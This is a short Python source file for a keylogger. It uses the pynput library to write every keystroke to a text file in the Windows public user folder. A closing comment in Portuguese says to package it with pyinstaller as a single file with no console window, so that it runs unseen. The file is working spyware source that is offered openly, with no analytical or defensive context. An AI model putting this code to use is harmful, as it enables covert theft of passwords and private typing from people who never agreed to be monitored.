from pynput import keyboard 
log_file = "C:\\Users\\Public\\log.txt"
def on_press(key):
    with open(log_file,'a') as f:
        f.write(f"{key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


# Execute usando pyinstaller --onefile -noconsole keylogger.py

